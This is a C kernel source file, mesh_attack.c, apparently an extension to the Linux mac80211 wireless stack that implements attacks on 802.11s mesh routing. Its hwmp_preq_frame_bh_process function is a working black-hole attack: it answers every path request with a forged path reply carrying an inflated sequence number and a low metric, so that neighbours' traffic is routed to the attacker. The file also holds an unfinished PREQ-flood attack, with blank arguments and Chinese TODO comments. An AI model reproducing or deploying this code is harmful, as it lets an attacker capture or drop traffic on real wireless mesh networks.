/*
 * =====================================================================================
 * 
 *       Filename:  mesh_attack.c
 *    Description:  mesh attack 
 *         Author:  Dennis (), shangxindu@gmail.com
 *
 * =====================================================================================
 */
#include "mesh.h"
#define CONFIG_MAC80211_MESH_ATTACK_DEBUG
#ifdef CONFIG_MAC80211_MESH_ATTACK_DEBUG
#define msatk_dbg(fmt, args...)   printk(KERN_DEBUG "Mesh attack: " fmt, ##args)
#else
#define msatk_dbg(fmt, args...)   do { (void)(0); } while (0)
#endif

#define MESH_PREQ_ATTACK_INTVL 10
#define default_lifetime(s) \
	MSEC_TO_TU(s->u.mesh.mshcfg.dot11MeshHWMPactivePathTimeout)
#define MSEC_TO_TU(x) (x*1000/1024)

static inline u32 u32_field_get(u8 *preq_elem, int offset, bool ae)
{
	if (ae)
		offset += 6;
	return get_unaligned_le32(preq_elem + offset);
}

/* Black hole attack IE processing macros */
#define AE_F			(1<<6)
#define AE_F_SET(x)		(*x & AE_F)
#define PREQ_IE_FLAGS(x)	(*(x))
#define PREQ_IE_HOPCOUNT(x)	(*(x + 1))
#define PREQ_IE_TTL(x)		(*(x + 2))
#define PREQ_IE_PREQ_ID(x)	u32_field_get(x, 3, 0)
#define PREQ_IE_ORIG_ADDR(x)	(x + 7)
#define PREQ_IE_ORIG_SN(x)	u32_field_get(x, 13, 0);
#define PREQ_IE_LIFETIME(x)	u32_field_get(x, 17, AE_F_SET(x));
#define PREQ_IE_METRIC(x) 	u32_field_get(x, 21, AE_F_SET(x));
#define PREQ_IE_TARGET_F(x)	(*(AE_F_SET(x) ? x + 32 : x + 26))
#define PREQ_IE_TARGET_ADDR(x) 	(AE_F_SET(x) ? x + 33 : x + 27)
#define PREQ_IE_TARGET_SN(x) 	u32_field_get(x, 33, AE_F_SET(x));


#define net_traversal_jiffies(s) \
	msecs_to_jiffies(s->u.mesh.mshcfg.dot11MeshHWMPnetDiameterTraversalTime)
#define default_lifetime(s) \
	MSEC_TO_TU(s->u.mesh.mshcfg.dot11MeshHWMPactivePathTimeout)
#define min_preq_int_jiff(s) \
	(msecs_to_jiffies(s->u.mesh.mshcfg.dot11MeshHWMPpreqMinInterval))
#define max_preq_retries(s) (s->u.mesh.mshcfg.dot11MeshHWMPmaxPREQretries)
#define disc_timeout_jiff(s) \
	msecs_to_jiffies(sdata->u.mesh.mshcfg.min_discovery_timeout)

struct mesh_attack_node{
	struct timer_list flood_timer;
	unsigned long data;                         /* data point */
};
//struct mesh_flood_node fnode;

int mesh_preq_flood_frame_tx(u8 * ,struct ieee80211_sub_if_data *);
u8 *target_addr_fake;
static const u8 broadcast_addr[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

u8 *mesh_attack_alloc()
{	
	u8 *p;
	p=kmalloc(6*sizeof(u8),GFP_KERNEL);
	if(!p)
	{
	msatk_dbg("can not alloc mem!\n");
		return NULL;
	}else 
		return p;
}


int mesh_attack_init(struct ieee80211_sub_if_data *sdata,struct mesh_flood_node * node )
{
	struct ieee80211_if_mesh * ifmsh=&sdata->u.mesh;
	target_addr_fake=mesh_attack_alloc();
	if(!target_addr_fake)
		return -ENOMEM;
	setup_timer(&ifmsh->mesh_flood_timer,       /* setup timer for flood attack */
			mesh_flood_timer,
			(unsigned long) sdata);
	node->last_flood=jiffies;
	node->count=0;

	//blank
	set_bit(/*tobemodified*/,&ifmsh->wrkq_flags); /* flood attack control bit */
	//blank

	return 0;
}

void mesh_flood_timer(unsigned long data)
{
	struct ieee80211_sub_if_data *sdata =
		(struct ieee80211_sub_if_data *) data;
	struct ieee80211_if_mesh *ifmsh = &sdata->u.mesh;
	struct ieee80211_local *local = sdata->local;

	ieee80211_queue_work(&local->hw, &sdata->work);//ymjifmesh-->sdata
}

void process_flood_attack(struct mesh_flood_node * node,struct ieee80211_sub_if_data *sdata)
{
	if(time_after(jiffies,node->last_flood+msecs_to_jiffies(10)))
	{
		node->count++;		
		//to be modified
		//生成fake地址
		//to be modified
		//调用生成泛洪preq帧的函数
		
	}
	
}

/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  mesh_preq_flood_frame_tx
 *  Description:  construct preq frame
 * =====================================================================================
 */
int mesh_preq_flood_frame_tx(u8 *target,struct ieee80211_sub_if_data *sdata)
{
	//to be modified
	//仿造mesh_hwmp.c中的mesh_path_sel_frame_tx,编写泛洪帧发送函数
	/*
	int mesh_path_sel_frame_tx(enum mpath_frame_type action, u8 flags,
		u8 *orig_addr, __le32 orig_sn, u8 target_flags, u8 *target,
		__le32 target_sn, const u8 *da, u8 hop_count, u8 ttl,
		__le32 lifetime, __le32 metric, __le32 preq_id,
		struct ieee80211_sub_if_data *sdata)
{
	struct ieee80211_local *local = sdata->local;
	struct sk_buff *skb = dev_alloc_skb(local->hw.extra_tx_headroom + 400);
	struct ieee80211_mgmt *mgmt;
	u8 *pos;
	int ie_len;

	if (!skb)
		return -1;
	skb_reserve(skb, local->hw.extra_tx_headroom);
	mgmt = (struct ieee80211_mgmt *)
		skb_put(skb, 25 + sizeof(mgmt->u.action.u.mesh_action));
	memset(mgmt, 0, 25 + sizeof(mgmt->u.action.u.mesh_action));
	mgmt->frame_control = cpu_to_le16(IEEE80211_FTYPE_MGMT |
					  IEEE80211_STYPE_ACTION);

	memcpy(mgmt->da, da, ETH_ALEN);
	memcpy(mgmt->sa, sdata->vif.addr, ETH_ALEN);
	memcpy(mgmt->bssid, sdata->vif.addr, ETH_ALEN);
	mgmt->u.action.category = WLAN_CATEGORY_MESH_ACTION;
	mgmt->u.action.u.mesh_action.action_code =
					WLAN_MESH_ACTION_HWMP_PATH_SELECTION;

	switch (action) {
	case MPATH_PREQ:
		mhwmp_dbg("sending PREQ to %pM", target);
		ie_len = 37;
		pos = skb_put(skb, 2 + ie_len);
		*pos++ = WLAN_EID_PREQ;
		break;
	case MPATH_PREP:
		mhwmp_dbg("sending PREP to %pM", target);
		ie_len = 31;
		pos = skb_put(skb, 2 + ie_len);
		*pos++ = WLAN_EID_PREP;
		break;
	case MPATH_RANN:
		mhwmp_dbg("sending RANN from %pM", orig_addr);
		ie_len = sizeof(struct ieee80211_rann_ie);
		pos = skb_put(skb, 2 + ie_len);
		*pos++ = WLAN_EID_RANN;
		break;
	default:
		kfree_skb(skb);
		return -ENOTSUPP;
		break;
	}
	*pos++ = ie_len;
	*pos++ = flags;
	*pos++ = hop_count;
	*pos++ = ttl;
	if (action == MPATH_PREP) {
		memcpy(pos, target, ETH_ALEN);
		pos += ETH_ALEN;
		memcpy(pos, &target_sn, 4);
		pos += 4;
	} else {
		if (action == MPATH_PREQ) {
			memcpy(pos, &preq_id, 4);
			pos += 4;
		}
		memcpy(pos, orig_addr, ETH_ALEN);
		pos += ETH_ALEN;
		memcpy(pos, &orig_sn, 4);
		pos += 4;
	}
	memcpy(pos, &lifetime, 4);	
	pos += 4;
	memcpy(pos, &metric, 4);
	pos += 4;
	if (action == MPATH_PREQ) {
		*pos++ = 1; 
		*pos++ = target_flags;
		memcpy(pos, target, ETH_ALEN);
		pos += ETH_ALEN;
		memcpy(pos, &target_sn, 4);
		pos += 4;
	} else if (action == MPATH_PREP) {
		memcpy(pos, orig_addr, ETH_ALEN);
		pos += ETH_ALEN;
		memcpy(pos, &orig_sn, 4);
		pos += 4;
	}

	ieee80211_tx_skb(sdata, skb);
	return 0;
*/
}


void hwmp_preq_frame_bh_process(struct ieee80211_sub_if_data *sdata,
				    struct ieee80211_mgmt *mgmt,
				    u8 *preq_elem, u32 metric)
{
	struct ieee80211_if_mesh *ifmsh = &sdata->u.mesh;
	u8 *target_addr, *orig_addr;
	u8 target_flags, ttl;
	u32 orig_sn, target_sn, lifetime;
	bool reply = true;

	/* Update target SN, if present */
	target_addr = PREQ_IE_TARGET_ADDR(preq_elem);
	orig_addr = PREQ_IE_ORIG_ADDR(preq_elem);
	target_sn = PREQ_IE_TARGET_SN(preq_elem);
	orig_sn = PREQ_IE_ORIG_SN(preq_elem);
	target_flags = PREQ_IE_TARGET_F(preq_elem);

	msatk_dbg("received PREQ from %pM for %pM\n", orig_addr,target_addr);

	if (memcmp(target_addr, sdata->dev->dev_addr, ETH_ALEN) == 0) {
		msatk_dbg("PREQ is for us, send regular prep\n");
//		reply = true;
		metric = 0;
		if (time_after(jiffies, ifmsh->last_sn_update +
					net_traversal_jiffies(sdata)) ||
		    time_before(jiffies, ifmsh->last_sn_update)) {
			target_sn = ++ifmsh->sn;
			ifmsh->last_sn_update = jiffies;
		}
	} else 
		metric=1;		

	if (reply) {
		lifetime = PREQ_IE_LIFETIME(preq_elem);
		ttl = ifmsh->mshcfg.dot11MeshTTL;
		++target_sn;
		if(ttl!=0)
		{
			//msatk_dbg("replying fake PREP to %pM with sn=%lu",target_addr,target_sn);
			mesh_path_sel_frame_tx(MPATH_PREP, 0, target_addr,
				cpu_to_le32(target_sn), 0, orig_addr,
				cpu_to_le32(orig_sn), mgmt->sa, 0, ttl,
				cpu_to_le32(lifetime), cpu_to_le32(metric),
				0, sdata);
		} else
			ifmsh->mshstats.dropped_frames_ttl++;
	}
}



